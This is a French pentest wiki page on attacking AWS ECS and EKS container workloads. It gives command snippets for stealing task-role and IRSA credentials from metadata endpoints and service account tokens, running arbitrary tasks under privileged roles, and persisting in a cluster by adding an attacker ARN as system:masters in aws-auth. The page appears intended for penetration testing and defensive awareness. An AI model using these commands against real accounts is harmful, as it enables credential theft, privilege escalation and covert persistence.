---
order: 3
title: "Conteneurs : abus du rôle de tâche et du runtime ECS et EKS"
description: "Attaquer les charges de travail ECS et EKS : vol du rôle de tâche via le point de terminaison de métadonnées de tâche, abus de la définition de tâche, et accès au runtime du conteneur."
keywords:
  - ECS
  - EKS
  - rôle de tâche
  - métadonnées de tâche
  - conteneur
---

# Containers

AWS exécute des conteneurs via ECS (son propre orchestrateur) et EKS (Kubernetes managé). Les deux attachent un rôle IAM à la charge de travail, et les deux exposent un point de terminaison de métadonnées à l'intérieur du conteneur qui distribue les identifiants de ce rôle, ce qui fait d'une RCE dans un conteneur une voie de vol d'identifiants AWS. Écrire une définition de tâche est en soi une primitive d'exécution : vous choisissez l'image, la commande, et le rôle sous lequel elle s'exécute.

## Voler le rôle de tâche (ECS)

```bash
# Inside an ECS task, the role creds come from the task metadata endpoint
curl -s ${ECS_CONTAINER_METADATA_URI_V4}/task
curl -s 169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}
```

## Exécuter votre propre tâche

```bash
# Register a task definition with your image and a privileged task role, then run it
aws ecs register-task-definition --family x --task-role-arn <privileged-role> \
  --container-definitions '[{"name":"c","image":"<you>/img","essential":true}]'
aws ecs run-task --cluster <c> --task-definition x
```

## EKS : d'IAM vers le cluster

EKS mappe les principaux IAM vers des identités Kubernetes, si bien qu'un point d'appui IAM avec `eks:DescribeCluster` et un mappage correspondant devient un accès dans le cluster :

```bash
# mint a short-lived bearer token for the cluster from your IAM creds
aws eks get-token --cluster-name <cluster>

# write a kubeconfig that calls get-token under the hood, then act
aws eks update-kubeconfig --name <cluster>   # needs eks:DescribeCluster
kubectl auth can-i --list
```

La liaison IAM-vers-RBAC vit dans la ConfigMap `aws-auth` (ou les access entries plus récentes). Avec un accès en écriture à celle-ci depuis un principal mappé, ajoutez votre propre ARN comme administrateur de cluster et persistez :

```bash
# grant your IAM user/role system:masters by editing the mapping
kubectl -n kube-system edit configmap aws-auth
# add under mapRoles/mapUsers:
#   - userarn: arn:aws:iam::<acct>:user/<you>
#     username: attacker
#     groups: [ "system:masters" ]
```

### IRSA et le rôle de nœud

Les pods s'authentifient auprès d'AWS de deux manières, toutes deux pillables :

- **Rôle d'instance du nœud** : un pod qui atteint l'IMDS du nœud (`169.254.169.254`) obtient les identifiants du profil d'instance du nœud worker, souvent larges. Bloquer l'IMDS depuis les pods est fréquemment oublié.
- **IRSA (IAM Roles for Service Accounts)** : le jeton de compte de service projeté du pod est échangé contre des identifiants de rôle via le fournisseur OIDC du cluster. Lisez le jeton et assumez le rôle directement :

```bash
TOKEN=$(cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token)
aws sts assume-role-with-web-identity \
  --role-arn "$AWS_ROLE_ARN" --role-session-name x \
  --web-identity-token "$TOKEN" --query Credentials
```

## Notes d'exploitation

- `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` est l'équivalent ECS de l'IMDS ; une server-side request forgery à l'intérieur d'une tâche l'atteint tout comme une SSRF EC2 atteint 169.254.169.254.
- Enregistrer et exécuter une tâche nécessite `iam:PassRole` sur le rôle de tâche, c'est donc aussi une voie d'élévation de privilèges d'identité ; une définition de tâche que vous contrôlez est du code arbitraire sous le rôle de tâche.
- Modifier `aws-auth` constitue une persistance durable dans le cluster : le mappage ajouté survit jusqu'à ce qu'un opérateur le remarque, et la journalisation côté IAM ne montre pas la modification de la ConfigMap.
- Les identifiants de rôle IRSA ne sont restreints que dans la mesure de la condition `sub` de la politique de confiance du rôle sur le compte de service ; une condition laxiste permet à un pod d'assumer le rôle d'un autre compte de service.
- Les attaques Kubernetes génériques (RBAC, jetons de compte de service, évasion de pod) vivent dans la zone Containers ; les pages ici restent sur l'angle du plan de contrôle AWS et de l'identité de nœud.

## Outils

- **AWS CLI** (`ecs register-task-definition`, `run-task`, `eks update-kubeconfig`).
- **Pacu** (`ecs__enum`, `ecs__backdoor_task_def`) : énumération ECS et backdooring de définition de tâche.
- **kubectl** / **Peirates** : travail dans le cluster sur EKS.

## Références

- [HackTricks Cloud: ECS and EKS](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-ecs-enum.html)
- [AWS: task IAM roles](https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-iam-roles.html)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
- [Datadog Security Labs](https://securitylabs.datadoghq.com/)
- [Peirates (InGuardians)](https://github.com/inguardians/peirates)
